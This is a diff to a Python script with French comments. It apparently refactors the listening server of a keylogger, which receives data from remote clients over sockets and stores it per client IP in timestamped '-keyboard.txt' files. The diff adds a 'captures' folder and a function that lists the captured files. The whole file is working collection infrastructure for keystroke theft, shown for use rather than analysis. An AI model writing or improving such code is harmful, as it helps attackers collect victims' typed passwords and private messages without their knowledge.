@@ -6,8 +6,6 @@ import sys
 import os
 from pathlib import Path
 
-
-
 # Arguments 
 
 parser = argparse.ArgumentParser()
@@ -26,6 +24,10 @@ args = parser.parse_args()
 #     print("pas assez d'arguments")
 #     exit(1)
 
+#Variables
+
+cwd = Path.cwd()
+path_captures = cwd / "captures"
 
 # Fonctions
 
@@ -36,9 +38,9 @@ def handle_client(conn, addr):
         # Réception des données
         data = conn.recv(1024).decode('utf-8')
 
-        cwd = Path.cwd()
-        fic = list(cwd.glob(f"{addr[0]}*.txt"))
-        filename = f"{addr[0]}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"
+        
+        fic = list(path_captures.glob(f"{addr[0]}*.txt"))
+        filename = path_captures / f"{addr[0]}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"
         
         if fic == []:
             with open(filename, 'w') as file:
@@ -58,8 +60,11 @@ def handle_client(conn, addr):
         conn.close()
 
 
-
-
+def display_files():
+    files = os.listdir(path_captures)
+    print("List of files captured :")
+    for file in files:
+        print(" - " + file)
 
 
 # Traitement
@@ -84,7 +89,9 @@ if args.listen:
         handle_client(conn, addr)
 
 elif args.show:
-    print("display all the files")
+    display_files()
+    sys.exit()
+
 
 elif args.readfile:
     print("read a file")
